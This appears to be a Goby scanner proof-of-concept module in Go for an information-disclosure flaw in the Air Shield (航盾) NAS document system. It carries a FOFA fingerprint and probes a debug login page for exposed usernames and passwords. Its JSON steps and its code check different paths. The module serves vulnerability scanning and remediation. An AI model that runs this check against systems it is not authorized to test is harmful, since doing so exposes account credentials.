package exploits

import (
    "fmt"
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "strings"
)

func init() {
    expJson := `{
    "Name": "Air Shield NAS electronic document security management system information leakage",
    "Description": "<p>On the basis of security management standards, AirShield NAS electronic document security management system realizes functions such as rapid transfer of large files in the information system through technologies such as security level control and file exchange control. </p><p>There is information leakage in the system, and information such as system account passwords can be obtained.</p>",
    "Product": "Air Shield NAS",
    "Homepage": "null",
    "DisclosureDate": "2021-06-01",
    "Author": "mayi",
    "FofaQuery": "body=\"航盾NAS\"",
    "GobyQuery": "body=\"航盾NAS\"",
    "Level": "2",
    "Impact": "<p>There is an information leakage vulnerability in the Air Shield NAS electronic document security management system. Attackers can obtain sensitive information such as system accounts by accessing webpage information.</p>",
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.0",
    "Is0day": true,
    "Recommendation": "<p>1.Delete web pages that lead to information leakage.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "CN": {
            "Name": "航盾NAS电子文档安全管理系统信息泄漏",
            "Product": "航盾NAS电子文档安全管理系统",
            "Description": "<p>航盾NAS电子文档安全管理系统在安全管理标准的基础上，通过密级控制、文件交换控制等技术实现信息系统内大文件快速传递等功能。</p><p>该系统存在信息泄漏，可获取系统账户密码等信息。</p>",
            "Recommendation": "<p>1、删除导致信息泄漏的网页等。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>航盾NAS电子文档安全管理系统存在信息泄漏漏洞，攻击者通过访问网页信息，获取系统账户等敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "信创"
            ]
        },
        "EN": {
            "Name": "Air Shield NAS electronic document security management system information leakage",
            "Product": "Air Shield NAS",
            "Description": "<p>On the basis of security management standards, AirShield NAS electronic document security management system realizes functions such as rapid transfer of large files in the information system through technologies such as security level control and file exchange control. </p><p>There is information leakage in the system, and information such as system account passwords can be obtained.</p>",
            "Recommendation": "<p>1.Delete web pages that lead to information leakage.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is an information leakage vulnerability in the Air Shield NAS electronic document security management system. Attackers can obtain sensitive information such as system accounts by accessing webpage information.</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "Information technology application innovation industry"
            ]
        }
    },
    "References": [],
    "HasExp": false,
    "ExpParams": [],
    "ScanSteps": [
        null
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "Information technology application innovation industry"
    ],
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "航盾NAS电子文档安全管理系统"
        ]
    },
    "PocId": "7365"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
            maipuhttp:=httpclient.NewGetRequestConfig("/sp/debug_login.jsp")
            if resp, err := httpclient.DoHttpRequest(u, maipuhttp); err == nil {
                fmt.Printf(resp.RawBody)
                if strings.Contains(resp.Status, "200") && strings.Contains(resp.RawBody, "user name") && strings.Contains(resp.RawBody, "password"){
                    return true
                }
            }

            return false
        },
        nil,
    ))
}
//       ./goscanner -m HandunNAS_leakinfo -t 172.16.14.133
